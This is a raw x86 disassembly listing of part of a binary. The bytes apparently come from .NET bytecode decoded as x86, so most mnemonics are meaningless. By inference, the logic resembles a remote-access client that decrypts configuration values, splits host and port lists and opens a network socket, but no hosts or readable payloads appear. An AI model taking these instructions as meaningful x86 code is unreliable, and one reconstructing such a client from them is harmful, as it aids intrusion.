  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	12 01                	adc    (%ecx),%al
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	c5 02                	lds    (%edx),%eax
  4028e3:	00 70 80             	add    %dh,-0x80(%eax)
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	78 03                	js     0x4028f0
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	2b 04 00             	sub    (%eax,%eax,1),%eax
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	3f                   	aas
  402900:	04 00                	add    $0x0,%al
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	67 04 00             	addr16 add $0x0,%al
  40290c:	70 80                	jo     0x40288e
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	c1 04 00 70          	roll   $0x70,(%eax,%eax,1)
  402917:	80 08 00             	orb    $0x0,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	74 05                	je     0x402924
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	77 17                	ja     0x402940
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	2a 1f                	sub    (%edi),%bl
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	dd 1f                	fstpl  (%edi)
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	90                   	nop
  402946:	20 00                	and    %al,(%eax)
  402948:	70 80                	jo     0x4028ca
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	43                   	inc    %ebx
  402956:	21 00                	and    %eax,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	47                   	inc    %edi
  402960:	21 00                	and    %eax,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	fa                   	cli
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 04 22 00       	add    $0x220472,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	04 22                	add    $0x22,%al
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 06 22    	add    %esp,0x22067216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
